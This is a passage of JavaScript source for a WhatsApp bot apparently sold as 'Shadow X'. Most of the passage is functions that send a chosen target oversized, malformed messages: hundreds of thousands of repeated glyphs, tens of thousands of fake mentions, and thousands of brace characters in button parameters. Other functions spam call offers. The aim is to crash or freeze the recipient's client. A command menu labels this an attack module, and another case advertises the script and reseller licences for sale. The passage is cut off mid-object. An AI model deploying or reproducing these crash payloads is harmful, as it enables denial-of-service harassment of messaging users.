⃪⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
	async function crashui2(target, ptcp = false) {
    await ziole.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝑫𝒂𝒑𝒛𝒚 𝐕𝟏 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function IosMJ(target, Ptcp = false) {
      await ziole.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://ziole_apex_zephyr",
                mediaUrl: "https://ziole_apex_zephyr",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://ziole_apex_zephyr",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function sendOfferCall(target) {
    try {
        await ziole.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await ziole.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}

async function ForceXsystem(ziole, target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "༑⌁⃰ziole & zeyy Is hereཀ‌‌🦠" + "ꦾ".repeat(35000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(15000),
            buttons: [
              {
              name: "single_select",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "call_permission_request",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_url",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_call",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_copy",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_cancel_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "address_message",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "send_location",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "quick_reply",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "mpm",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
            ],
          },
        },
      },
    },
  };

  await ziole.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function Crashui(target) {
      let Crash = "༑⌁⃰ziole & zeyy Is hereཀ‌‌🦠" + "ꦾ".repeat(65000);
      await ziole.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: Crash,
            url: "https://youtube.com/@DavaExploit",
            address: "𑇂𑆵𑆴𑆿".repeat(45000),
          },
          hasMediaAttachment: true,
        },
        {
          participant: {
           jid: target,
           mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                  ),
                 ]
          },
        }
      );
    }
// Command handler
switch (command) {
//========[ Menu Utama ]========//
case 'menu':
case 'crash': {
    await ziole.sendMessage(m.chat, {
        react: { text: `✨`, key: m.key }
    });

    const tramenu =
        `─ ( 🐉 ) Ола... меня зовут 𝗦𝗛𝗔𝗗𝗢𝗪 𝗫, я тебе помогу.

Предупреждение: запрещено портить чужой WhatsApp без явной причины. 

-# Information Script
見 Developer Script : Zeyy/Ziole
女 Name Script : Shadow X
么 Version Script : 1.0.0 (Buy Only | Free)
グ Type Version : Delay Only 
ボ Mode Bot : Public 見 | Self 流

> prefix = / (slash)

 PRESS THE BUTTON

Zeyy | Ziole Private Here
janagan mein ban mulu pengecut`

    await ziole.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/fzhktx.png' }, // ✅ URL kamu
        caption: tramenu ,
  footer: "MODUL",
  buttons: [
    {
      buttonId: '.belisc',
      buttonText: {
        displayText: '𝙱𝙴𝙻𝙸 𝚂𝙲'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: 'CRASh'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'CRASHV2',
          sections: [
            {
              title: namaowner,
              highlight_label: 'powered by : ziole & zeyy',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'untuk menampilkan fitur owner',
                  id: '.ownermenu',
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴᴜ',
                  title: 'MODUL ATTACK',
                  description: 'untuk menampilkan menu bug menu',
                  id: '.bugmenu',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Thanks To ]========//
case 'tqto' : {
await ziole.sendMessage(m.chat, { react: { text: `🕊️`, key: m.key }});
terimakasih = 
`
╭─ \`⁅: 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 :⁆\`──◈
│ ╼ *|| ziole ( Dev programer )*
│ ╼ *|| zeyy ( Dev menu and func )*
╰───────────────────◈
`
ziole.sendMessage(m.chat, {image: {url: imgmenu }, caption: terimakasih ,
  footer: "MODUL V2",
  buttons: [
    {
      buttonId: '.back',
      buttonText: {
        displayText: 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ '
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: 'Modul V2'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Modul V2',
          sections: [
            {
              title: namaowner,
              highlight_label: 'powered by : ziole',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Menampilkan Fitur Owner',
                  id: '.ownermenu',
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴᴜ',
                  title: 'MODUL ATTACK',
                  description: 'Menampilkan Bug Menu MODUL CRASH',
                  id: '.bugmenu',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Beli Script ]========//
case 'belisc': {
let teks =`
*\`Harga PO Script\`*
> *Enc ?* 15k*

*\`Harga Rilis Script\`*
> *Enc ? 25k*

*\`Seller Script shadowx\`*
> *Reseller Script ? 30k*
> *PT Script ? 50k*

*Benefit*
- Resselller Bisa open op dan jualin sc
- Owner Bisa Open Resselller Sc, Bisa Jual Sc Nya Juga

`;
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
   message: {
       "messageContextInfo": {
         "deviceListMetadata": {},
         "deviceListMetadataVersion": 2
       },
       interactiveMessage: proto.Message.InteractiveMessage.create({
         body: proto.Message.InteractiveMessage.Body.create({
           text: teks
         }),
         footer: proto.Message.InteractiveMessage.Footer.create({
           text: "BUY KLIK TOMBOL DI BAWAH"
         }),
         header: proto.Message.InteractiveMessage.Header.create({
           title: `🛒 \`ziole & zeyy Developer\``,
           subtitle: "",
           hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/DHXzVYb0/shaban-md.png" } }, { upload: ziole.waUploadToServer }))}),
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
           buttons: [
             {
                "name": "cta_url",
